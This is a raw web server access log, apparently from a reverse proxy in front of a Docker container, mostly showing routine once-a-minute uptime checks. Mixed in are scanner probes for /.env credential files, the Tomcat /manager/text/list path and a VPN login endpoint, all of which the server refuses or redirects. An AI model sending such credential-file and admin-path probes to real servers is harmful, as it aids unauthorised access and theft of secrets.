184.105.247.194 - - [20/Dec/2023:11:50:24 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1495 "-" "-" 0ms
184.105.247.194 - - [20/Dec/2023:11:50:32 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1496 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:11:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1497 "www@docker" "http://172.20.0.9:80" 0ms
184.105.247.194 - - [20/Dec/2023:11:50:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1498 "-" "-" 0ms
184.105.247.194 - - [20/Dec/2023:11:50:50 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1499 "-" "-" 0ms
184.105.247.194 - - [20/Dec/2023:11:50:55 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1500 "-" "-" 0ms
184.105.247.194 - - [20/Dec/2023:11:51:10 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1501 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:11:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1502 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1503 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1504 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1505 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1506 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:11:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1507 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1508 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1509 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1510 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:11:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1511 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1512 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1513 "www@docker" "http://172.20.0.9:80" 1ms
143.198.160.53 - - [20/Dec/2023:11:56:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1514 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:11:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1515 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:11:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1516 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:11:58:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1517 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:11:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1518 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1519 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:11:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1520 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:11:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1521 "www@docker" "http://172.20.0.9:80" 0ms
78.153.140.221 - - [20/Dec/2023:12:00:14 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1522 "-" "-" 0ms
78.153.140.221 - - [20/Dec/2023:12:00:15 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1523 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1524 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1525 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1526 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1527 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1528 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1529 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1530 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1531 "www@docker" "http://172.20.0.9:80" 1ms
57.129.23.166 - - [20/Dec/2023:12:03:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1532 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:12:03:34 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1533 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1534 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1535 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1536 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1537 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:12:05:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1538 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1539 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1540 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1541 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1542 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1543 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1544 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1545 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1546 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1547 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1548 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1549 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1550 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1551 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1552 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1553 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1554 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1555 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1556 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1557 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1558 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1559 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1560 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1561 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1562 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1563 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1564 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1565 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1566 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1567 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1568 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1569 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1570 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1571 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1572 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1573 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1574 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1575 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1576 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1577 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1578 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1579 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1580 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1581 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1582 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1583 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1584 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1585 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1586 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1587 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1588 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1589 "www@docker" "http://172.20.0.9:80" 0ms
149.102.133.149 - - [20/Dec/2023:12:31:20 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 1590 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:12:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1591 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1592 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1593 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1594 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1595 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1596 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1597 "www@docker" "http://172.20.0.9:80" 0ms
54.36.115.221 - - [20/Dec/2023:12:35:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1598 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:12:35:07 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1599 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1600 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1601 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1602 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1603 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1604 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1605 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1606 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1607 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1608 "www@docker" "http://172.20.0.9:80" 0ms
209.145.60.172 - - [20/Dec/2023:12:39:21 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1609 "web-to-websecure@internal" "-" 0ms
209.145.60.172 - - [20/Dec/2023:12:39:21 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1610 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:12:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1611 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1612 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1613 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1614 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1615 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1616 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1617 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1618 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1619 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1620 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1621 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1622 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1623 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1624 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1625 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1626 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1627 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1628 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1629 "www@docker" "http://172.20.0.9:80" 1ms
57.129.23.166 - - [20/Dec/2023:12:48:47 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1630 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:12:48:47 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1631 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1632 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1633 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1634 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1635 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1636 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1637 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1638 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1639 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1640 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1641 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1642 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1643 "www@docker" "http://172.20.0.9:80" 0ms
57.128.141.133 - - [20/Dec/2023:12:54:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1644 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1645 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1646 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:12:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1647 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1648 "www@docker" "http://172.20.0.9:80" 0ms
198.199.97.44 - - [20/Dec/2023:12:56:49 +0000] "GET /manager/text/list HTTP/1.1" 301 17 "-" "-" 1649 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:12:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1650 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1651 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1652 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:12:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1653 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:12:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1654 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:12:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1655 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1656 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1657 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1658 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1659 "www@docker" "http://172.20.0.9:80" 0ms
192.241.231.42 - - [20/Dec/2023:13:01:47 +0000] "GET /manager/text/list HTTP/1.1" 301 17 "-" "-" 1660 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1661 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1662 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1663 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1664 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1665 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1666 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1667 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1668 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1669 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1670 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1671 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1672 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1673 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1674 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1675 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1676 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1677 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1678 "www@docker" "http://172.20.0.9:80" 0ms
